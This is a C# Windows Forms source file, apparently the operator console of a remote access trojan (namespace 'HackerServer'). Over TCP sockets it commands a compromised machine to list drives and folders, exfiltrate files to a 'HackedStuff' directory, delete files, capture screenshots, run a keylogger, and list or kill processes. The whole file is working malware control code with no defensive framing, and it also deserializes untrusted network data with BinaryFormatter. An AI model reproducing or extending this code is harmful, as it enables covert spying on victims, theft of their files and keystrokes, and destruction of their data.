using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Permissions;
using System.Text;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Runtime.Serialization;

namespace HackerServer
{
    public partial class Form1 : Form
    {
        ImageList imageList = new ImageList();
        TcpListener listenerComm;
        TcpListener listenerSer;
        TcpClient accComm;
        Connection c;
        public Form1(Connection c)
        {
            this.c = c;
            accComm = c.getAccComm();
            listenerSer = c.getSerListener();

            InitializeComponent();
            imageList.Images.Add("file", Image.FromFile("Icons\\B001.ico"));
            imageList.Images.Add("textfile", Image.FromFile("Icons\\B002.ico"));
            imageList.Images.Add("picture", Image.FromFile("Icons\\B036.ico"));
            imageList.Images.Add("drive", Image.FromFile("Icons\\B014.ico"));
            imageList.Images.Add("zip", Image.FromFile("Icons\\B026.ico"));
            imageList.Images.Add("empty folder", Image.FromFile("Icons\\B072.ico"));
            imageList.Images.Add("full folder", Image.FromFile("Icons\\B070.ico"));
        }

        #region Directories, Drives & Files

        private void requestDir(String path, TreeNode e)
        {
            //BufferedStream bufStream = new BufferedStream(accComm.GetStream());

            accComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("cd " + path), 0, ASCIIEncoding.ASCII.GetBytes("cd " + path).Length);
            listenForNodes(e);
        }

        private void requestDrives()
        {
            //BufferedStream bufStream = new BufferedStream(accComm.GetStream());

            accComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("cd drives"), 0, ASCIIEncoding.ASCII.GetBytes("cd drives").Length);
            TreeNode e = new TreeNode();
            treeView1.Nodes.Add(e);
            e.Text = "root";
            listenForNodes(e);
        }

        private void listenForNodes(TreeNode e)
        {
            TcpClient accSer = new TcpClient();
            try
            {
                listenerSer.Start();
                accSer = listenerSer.AcceptTcpClient();

                BinaryFormatter bf = new BinaryFormatter();
                while (accSer.Connected)
                {
                    TreeNode node = (TreeNode)bf.Deserialize(accSer.GetStream());
                    e.Nodes.Add(node);

                    if (node.ImageKey != "full folder" && node.ImageKey != "empty folder" && node.Text != "root")
                    {
                        ContextMenu menu = new ContextMenu();
                        MenuItem item = new MenuItem("Download");
                        MenuItem delete = new MenuItem("Delete");
                        delete.Click += delete_Click;
                        item.Click += menuitem_Click;
                        menu.MenuItems.Add(item);
                        menu.MenuItems.Add(delete);
                        node.ContextMenu = menu;
                        item.Name = node.Name;
                        item.Tag = node.Text;
                        delete.Name = node.Name;
                        delete.Tag = node.Text;
                    }

                    if (!accSer.Connected)
                        break;
                }

                listenerSer.Stop();
                accSer.Close();
            }
            catch (SerializationException ex)
            {

                listenerSer.Stop();
                accSer.Close();
            }

        }

        private void delete(string path)
        {
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("delete " + path);
            accComm.GetStream().Write(buffer, 0, buffer.Length);

            buffer = new byte[1024];
            accComm.GetStream().Read(buffer, 0, 1024);
            string answer = ASCIIEncoding.ASCII.GetString(buffer);

            textBox1.Text = answer;
        }

        private void download(string path, string filename)
        {

            String downloadpath = "E:\\HackedStuff";

            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("download " + path);
            accComm.GetStream().Write(buffer, 0, buffer.Length);

            FileReciever frec = new FileReciever(filename, downloadpath, progressBar1);
            Thread recThread = new Thread(frec.listen);
            recThread.Start();
        }

        #endregion

        #region Other Functions

        private void screenshot()
        {
            DateTime now = DateTime.Now;
            String date = now.ToString();
            date = date.Replace('.', ' ');
            date = date.Replace(':', ' ');
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("screenshot");
            accComm.GetStream().Write(buffer, 0, buffer.Length);
            FileReciever fr = new FileReciever("screenshot - " + date + ".bmp", @"E:\HackedStuff\Screenshots", progressBar1);
            fr.listen();
            Bitmap b = new Bitmap(@"E:\HackedStuff\Screenshots\" + "screenshot - " + date + ".bmp");
            Screenshot screenshotForm = new Screenshot(b);
            screenshotForm.Show();
        }

        private void startChat()
        {
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("startChat");
            accComm.GetStream().Write(buffer, 0, buffer.Length);
            Chat chatForm = new Chat();
            chatForm.Show();
        }

        #endregion

        #region Events

        void delete_Click(object sender, EventArgs e)
        {
            MenuItem item = (MenuItem)sender;

            delete(item.Name);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {

        }

        private void treeView1_KeyDown(object sender, KeyEventArgs e)
        {
            Keylogger k = new Keylogger();
            Thread t = new Thread(k.StartLogging); ;
            if (e.KeyCode == Keys.S)
            {
                t.Start();
            }

            if (e.KeyCode == Keys.E)
            {
                t.Abort();
            }
        }

        void menuitem_Click(object sender, EventArgs e)
        {
            MenuItem item = (MenuItem)sender;
            textBox1.Text = item.Name;

            String filename = (String)item.Tag;

            download(item.Name, filename);

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            treeView1.ImageList = imageList;
            treeView1.ImageKey = "file";

            listenerSer = new TcpListener(2014);

            //listenerComm = new TcpListener(2015);
            //listenerComm.Start();
            //accComm = listenerComm.AcceptTcpClient();

            requestDrives();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            TreeNode selected = e.Node;
            //searchFolder(e.Node.Name.ToString(), e.Node);
            if (e.Node.Text != "root")
                requestDir(selected.Name, e.Node);

        }

        private void startLogging_Click(object sender, EventArgs e)
        {
            startLoggin();
        }

        private void stopLoggin_Click(object sender, EventArgs e)
        {
            stopLoggin();
        }

        private void processButton_Click(object sender, EventArgs e)
        {
            getProcesses();
        }

        private void killButton_Click(object sender, EventArgs e)
        {
            System.Windows.Forms.ListBox.SelectedObjectCollection coll = listBox1.SelectedItems;
            string name = (string)coll[0];
            killProcess(name);
            getProcesses();
        }

        private void makeScreenshot_Click(object sender, EventArgs e)
        {
            screenshot();
        }

        private void chatButton_Click(object sender, EventArgs e)
        {
            startChat();
        }

        #endregion

        #region Keylogging

        private void startLoggin()
        {
            accComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("startlogging"), 0, ASCIIEncoding.ASCII.GetBytes("startlogging").Length);
            byte[] buffer = new byte[1024];
            accComm.GetStream().Read(buffer, 0, 1024);
            string response = ASCIIEncoding.ASCII.GetString(buffer);
            textBox1.Text = response;

        }

        private void stopLoggin()
        {
            accComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("stoplogging"), 0, ASCIIEncoding.ASCII.GetBytes("stoplogging").Length);
            byte[] buffer = new byte[1024];
            accComm.GetStream().Read(buffer, 0, 1024);
            string response = ASCIIEncoding.ASCII.GetString(buffer);
            textBox1.Text = response;

        }

        #endregion

        #region Processes

        private void getProcesses()
        {
            listBox1.Items.Clear();
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("getProcesses");
            accComm.GetStream().Write(buffer, 0, buffer.Length);

            string name = "null";
            while (!name.Contains("/e"))
            {
                buffer = new byte[1024];
                accComm.GetStream().Read(buffer, 0, 1024);
                name = ASCIIEncoding.ASCII.GetString(buffer);

                string[] pros = name.Split(new string[] { "/n" }, StringSplitOptions.RemoveEmptyEntries);
                foreach (string s in pros)
                {
                    listBox1.Items.Add(s);
                }

            }
        }

        private void killProcess(string name)
        {
            byte[] buffer = ASCIIEncoding.ASCII.GetBytes("kill " + name);
            accComm.GetStream().Write(buffer, 0, buffer.Length);
        }

        #endregion







        //private void searchFolder(string dir, TreeNode e)
        //{
        //    try
        //    {
        //        foreach (string dirC in Directory.GetDirectories(dir))
        //        {
        //            TreeNode tdir = new TreeNode(dirC);

        //            string[] splitted = dirC.Split(new char[] { '\\' });
        //            tdir.Text = splitted[splitted.Length - 1];

        //            tdir.Name = dirC;


        //            bool found = false;
        //            foreach (TreeNode node in e.Nodes)
        //            {

        //                if (node.Text.Equals(tdir.Text))
        //                {
        //                    found = true;
        //                    break;
        //                }
        //            }
        //            if (found)
        //                break;



        //            if (hasFiles(dirC))
        //                tdir.ImageKey = "full folder";

        //            else
        //                tdir.ImageKey = "empty folder";

        //            tdir.SelectedImageKey = tdir.ImageKey;

        //            e.Nodes.Add(tdir);
        //        }
        //    }
        //    catch (Exception) { }


        //    try
        //    {
        //        foreach (string fileC in Directory.GetFiles(dir))
        //        {
        //            TreeNode tfile = new TreeNode(fileC);

        //            string[] splitted = fileC.Split(new char[] { '\\' });
        //            tfile.Text = splitted[splitted.Length - 1];
        //            tfile.Name = fileC;

        //            bool found = false;
        //            foreach (TreeNode node in e.Nodes)
        //            {

        //                if (node.Text.Equals(tfile.Text))
        //                {
        //                    found = true;
        //                    break;
        //                }
        //            }
        //            if (found)
        //                break;

        //            setPicture(tfile);
        //            e.Nodes.Add(tfile);
        //            ContextMenu menu = new System.Windows.Forms.ContextMenu();
        //            MenuItem item = new MenuItem("Download");
        //            menu.MenuItems.Add(item);
        //            item.Name = tfile.Name;
        //            item.Tag = tfile.Text;
        //            item.Click += menuitem_Click;
        //            tfile.ContextMenu = menu;
        //        }
        //    }

        //    catch (Exception) { }

        //}

        //private bool hasFiles(string dir)
        //{
        //    try
        //    {
        //        if (Directory.GetDirectories(dir).Length == 0 && Directory.GetFiles(dir).Length == 0)
        //        {
        //            return false;
        //        }
        //        return true;
        //    }
        //    catch (Exception)
        //    {
        //    }

        //    return false;

        //}

        //private void setPicture(TreeNode n)
        //{
        //    char[] sep = new char[] { '.' };
        //    string[] splitted = n.Text.Split(sep);
        //    string endung = splitted[splitted.Length - 1];

        //    switch (endung)
        //    {
        //        case "txt":
        //            n.ImageKey = "textfile";
        //            break;
        //    }

        //    if (endung.Equals("rar") || endung.Equals("zip"))
        //        n.ImageKey = "zip";

        //    if (endung.Equals("png") || endung.Equals("jpg") || endung.Equals("gif") || endung.Equals("bmp"))
        //        n.ImageKey = "picture";

        //    n.SelectedImageKey = n.ImageKey;
        //}


    }
}
